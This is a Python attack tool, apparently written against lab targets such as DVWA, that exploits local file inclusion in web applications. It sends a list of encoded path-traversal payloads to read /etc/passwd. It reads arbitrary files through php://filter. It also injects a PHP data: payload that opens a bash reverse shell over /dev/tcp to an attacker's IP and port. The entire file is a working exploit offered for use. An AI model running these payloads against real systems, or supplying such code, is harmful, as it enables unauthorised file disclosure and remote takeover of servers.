import requests
import logging
import re
import argparse
import os

parser = argparse.ArgumentParser(description='LFI Scanner')
parser.add_argument('mode', help='Select scanner, shell, or search mode', choices=['scanner', 'shell', 'search'])
parser.add_argument('-u', '--url', help='ex:http://example.com?page=', required=True)
parser.add_argument('-p', '--phpsessid', help='ex: "PHPSESSID=0vjj8a9ntk6o77rulscscancd7; security=low"', required=False)
parser.add_argument('-i', help='IP address to connect back to', required=False)
parser.add_argument('-l', help='Listening port to connect back to', required=False)
parser.add_argument('-f', help='File to search for', required=False)
args = parser.parse_args()

# Get the url and cookies
url = args.url
cookies = {}
if args.phpsessid:
    cookies['PHPSESSID'] = args.phpsessid

# Payloads to test for LFI
payloads = ['../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../etc/passwd%00', '%252e%252e%252fetc%252fpasswd', '%252e%252e%252fetc%252fpasswd%00','%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd', '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00', '....//....//etc/passwd', '..///////..////..//////etc/passwd', '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd','file:///etc/passwd', "../../../etc/passwd", "..%2F..%2Fetc%2Fpasswd", "..%252f..%252fetc%252fpasswd", "..\\/..\\/etc\\/passwd", "..\\/..%5C..\\/..%5Cetc%5Cpasswd", "..%5C..%5Cetc%5Cpasswd", "..%c0%af..%c0%afetc%c0%afpasswd", "..%c0%ae..%c0%aeetc%c0%aepasswd", "..%252f..%252f..%252f..%252fetc%252fpasswd", "..%255c..%255c..%255c..%255cetc%255cpasswd",'..%255c..%255c..%255c..%255cetc%255c%255cpasswd']

# Generate a log file
logging.basicConfig(filename='lfi.log', level=logging.DEBUG)

# Code for the scanner mode
if args.mode == "scanner":
    # Iterate through each payload
    for payload in payloads:
        # Append the payload to the end of the url
        full_url = url + payload
        # Try to get a response from the web application
        try:
            response = requests.get(full_url, cookies=cookies, timeout=5)
            # Check if root is in the the response
            if 'root:' in response.text:
                # If root is found, success!
                print(f'LFI vulnerability found with payload: {payload}')
                print(f'Contents of /etc/passwd:\n')
                # Split the response text so that only /etc/passwd is shown
                lines = response.text.splitlines()
                for line in lines:
                    fields = line.split(':')
                    if len(fields) >= 7:
                        print(line)

                break

            # If root is not found, print not found message
            else:
                print(f'No LFI vulnerability found with payload: {payload}')
        # Exception for if the request times out or an error is generated.
        except requests.exceptions.Timeout:
            logging.warning(f'Request timed out for payload: {payload}')
        except requests.exceptions.RequestException as e:
            logging.error(f'Request failed for payload: {payload}. Error: {e}')

# Code for the shell mode
elif args.mode == "shell":
    # Create variables for the flag arguments
    ip = args.i
    port = args.l
    # If the ip and lport is not set, then print a message stating it's required.
    if ip is None or port is None:
        print("IP address and listening port must be provided for reverse shell.")
        exit()
    # Payload to test
    payload = 'data%3Atext%2Fplain%2C%3C%3Fphp%20%24ip%3D%27{}%27%3B%20%24port%3D{}%3B%20exec%28%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%24ip%2F%24port%200%3E%261%27%22%29%3B%3F%3E'.format(ip, port)

    # Append the payload to the url
    full_url = url + payload
    # Try to get response from the web application
    try:
        response = requests.get(full_url, cookies=cookies, timeout=5, allow_redirects=False)
        # If the response code is 200 and Error is not in the response, then success!
        if response.status_code == 200 and "error" not in response.text.lower():
            print(f'Successful shell execution with payload: {payload}')
        else:
            print(f'Shell not executed or permission denied with payload: {payload}')
    # Exception for if the request times out or an error is generated.
    except requests.exceptions.Timeout:
        logging.warning(f'Request timed out for payload: {payload}')
    except requests.exceptions.RequestException as e:
        logging.error(f'Request failed for payload: {payload}. Error: {e}')

# Code for the search mode
elif args.mode == "search":
    # Create a variable for the flag argument
    file = args.f

    # Payload to test
    payload = 'php://filter/resource={}'.format(file)

    # Append the payload to the url
    full_url = url + payload
    # Try to get response from the web application
    try:
        response = requests.get(full_url, cookies=cookies, timeout=5, allow_redirects=False)
        # If the response code is 200 and Error is not in the response, then success!
        if response.status_code == 200 and "error" not in response.text.lower():
            print(f'Successful file retrieval with payload: {payload}')
            print(response.text)
        else:
            print(f'File not found or permission denied with payload: {payload}')
    # Exception for if the request times out or an error is generated.
    except requests.exceptions.Timeout:
        logging.warning(f'Request timed out for payload: {payload}')
    except requests.exceptions.RequestException as e:
        logging.error(f'Request failed for payload: {payload}. Error: {e}')
# Print invalid mode if no mode is selected
else:
    print("Invalid mode selected.")
